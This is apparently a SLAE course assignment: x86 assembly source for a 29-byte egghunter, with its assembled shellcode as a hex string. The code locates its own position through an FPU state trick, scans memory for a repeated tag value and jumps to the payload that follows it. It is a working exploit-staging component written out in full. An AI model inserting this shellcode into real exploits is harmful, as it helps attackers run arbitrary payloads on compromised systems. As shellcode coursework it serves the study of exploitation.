;Description:	Assignment #3 (EggHunter, 29 bytes)
;Shellcode:		\xd9\xee\x9b\xd9\x74\x24\xf4\x58\x40\x81\x78\xf8\xaa\xbb\xcc\xdd\x75\xf6\x81\x78\xfc\xaa\xbb\xcc\xdd\x75\xed\xff\xe0
;Author: 		Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:		526

global _start
section .text
_start:
	fldz
	fstenv [esp-0xc]
	pop eax
ll:	inc eax
	cmp dword [eax-8],0xddccbbaa
	jne ll
	cmp dword [eax-4],0xddccbbaa
	jne ll
	jmp eax
